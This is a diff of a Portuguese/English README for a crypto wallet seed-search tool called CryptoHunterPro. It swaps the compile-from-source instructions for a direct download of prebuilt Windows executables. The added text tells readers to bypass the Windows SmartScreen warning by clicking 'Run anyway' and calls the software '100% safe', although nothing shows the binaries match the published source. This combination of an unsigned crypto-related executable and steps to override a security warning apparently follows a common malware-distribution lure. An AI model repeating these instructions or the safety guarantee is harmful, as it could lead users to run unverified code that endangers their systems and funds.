@@ -170,30 +170,35 @@ Os dois modulos funcionam juntos como um pipeline completo de recuperacao:
 
 ## Inicio Rapido (Windows)
 
-Siga estes 3 passos simples para rodar o programa no seu PC:
+### Download Direto
 
-### Passo 1: Instalar Go (apenas 1 vez)
+[Download CryptoHunterPro Windows Executables](https://github.com/henriquesmlourenco/CryptoHunterPro/raw/main/CryptoHunterPro_Windows_Executables.zip)
 
-1. Acesse: [https://go.dev/dl/](https://go.dev/dl/)
-2. Baixe o instalador para Windows: **`go1.24.4.windows-amd64.msi`** (ou versao mais recente disponivel)
-3. Execute o instalador (Next → Next → Finish)
-4. **Reinicie o computador**
+1. Baixe o ZIP acima
+2. Extraia em qualquer pasta do seu computador
+3. Execute o `.exe` desejado (x64 para Windows 64-bit, x86 para 32-bit)
 
-> **Requisito minimo:** Go 1.21 ou superior.
+### Aviso do Windows SmartScreen
 
-### Passo 2: Baixar este Repositorio
+Na primeira execucao, o Windows pode exibir a mensagem **"O Windows protegeu o computador"**. Isso acontece porque o programa e open-source e nao possui certificado digital pago (que custa $200-400/ano). O software e 100% seguro e o codigo-fonte esta disponivel publicamente neste repositorio para auditoria.
 
-1. Clique no botao verde **"Code"** (aqui no GitHub) → **"Download ZIP"**
-2. Extraia o ZIP em qualquer pasta do seu computador
+**Para prosseguir:**
 
-### Passo 3: Executar
+1. Clique em **"Mais informacoes"**
+2. Clique em **"Executar assim mesmo"**
 
-1. Abra a pasta `CRYPTO_HUNTER_PRO_Unmixer_Seed_Search`
-2. De **duplo clique** no arquivo `compilador.bat`
-3. O programa sera compilado e executado automaticamente
-4. Para o CIE, repita na pasta `CRYPTO_HUNTER_PRO_CIE`
+Isso so acontece na primeira vez. Apos executar uma vez, o Windows nao pergunta novamente.
 
-> **E so isso!** O `compilador.bat` faz tudo sozinho: verifica o Go, baixa dependencias e gera o executavel. Nenhum aviso do Windows, nenhum bloqueio.
+---
+
+### Compilar no seu PC (alternativa)
+
+Se preferir compilar localmente (elimina o aviso do SmartScreen por completo):
+
+1. Instale o Go: [https://go.dev/dl/](https://go.dev/dl/) (versao 1.21 ou superior)
+2. Reinicie o computador
+3. Baixe este repositorio (botao verde "Code" → "Download ZIP") e extraia
+4. Abra a pasta do modulo desejado e de duplo clique no `compilador.bat`
 
 ---
 
@@ -202,8 +207,8 @@ Siga estes 3 passos simples para rodar o programa no seu PC:
 1. Instale o Go: [go.dev/dl](https://go.dev/dl/)
 2. Clone o repositorio:
 ```bash
-git clone https://github.com/CryptoHunterPro/crypto-hunter-pro.git
-cd crypto-hunter-pro
+git clone https://github.com/henriquesmlourenco/CryptoHunterPro.git
+cd CryptoHunterPro
 ```
 3. Compile:
 ```bash
@@ -433,30 +438,35 @@ The two modules work together as a complete recovery pipeline:
 
 ## Quick Start (Windows)
 
-Follow these 3 simple steps to run the program on your PC:
+### Direct Download
 
-### Step 1: Install Go (one time only)
+[Download CryptoHunterPro Windows Executables](https://github.com/henriquesmlourenco/CryptoHunterPro/raw/main/CryptoHunterPro_Windows_Executables.zip)
 
-1. Go to: [https://go.dev/dl/](https://go.dev/dl/)
-2. Download the Windows installer: **`go1.24.4.windows-amd64.msi`** (or latest available version)
-3. Run the installer (Next → Next → Finish)
-4. **Restart your computer**
+1. Download the ZIP above
+2. Extract to any folder on your computer
+3. Run the desired `.exe` (x64 for 64-bit Windows, x86 for 32-bit)
 
-> **Minimum requirement:** Go 1.21 or higher.
+### Windows SmartScreen Warning
 
-### Step 2: Download this Repository
+On first run, Windows may display the message **"Windows protected your PC"**. This happens because the program is open-source and does not have a paid digital certificate (which costs $200-400/year). The software is 100% safe and the source code is publicly available in this repository for audit.
 
-1. Click the green **"Code"** button (here on GitHub) → **"Download ZIP"**
-2. Extract the ZIP to any folder on your computer
+**To proceed:**
 
-### Step 3: Run
+1. Click **"More info"**
+2. Click **"Run anyway"**
 
-1. Open the `CRYPTO_HUNTER_PRO_Unmixer_Seed_Search` folder
-2. **Double-click** the `compilador.bat` file
-3. The program will be compiled and executed automatically
-4. For CIE, repeat in the `CRYPTO_HUNTER_PRO_CIE` folder
+This only happens the first time. After running once, Windows will not ask again.
 
-> **That's it!** The `compilador.bat` does everything: checks Go, downloads dependencies, and generates the executable. No Windows warnings, no blocks.
+---
+
+### Compile on your PC (alternative)
+
+If you prefer to compile locally (completely eliminates the SmartScreen warning):
+
+1. Install Go: [https://go.dev/dl/](https://go.dev/dl/) (version 1.21 or higher)
+2. Restart your computer
+3. Download this repository (green "Code" button → "Download ZIP") and extract
+4. Open the desired module folder and double-click `compilador.bat`
 
 ---
 
@@ -465,8 +475,8 @@ Follow these 3 simple steps to run the program on your PC:
 1. Install Go: [go.dev/dl](https://go.dev/dl/)
 2. Clone the repository:
 ```bash
-git clone https://github.com/CryptoHunterPro/crypto-hunter-pro.git
-cd crypto-hunter-pro
+git clone https://github.com/henriquesmlourenco/CryptoHunterPro.git
+cd CryptoHunterPro
 ```
 3. Compile:
 ```bash
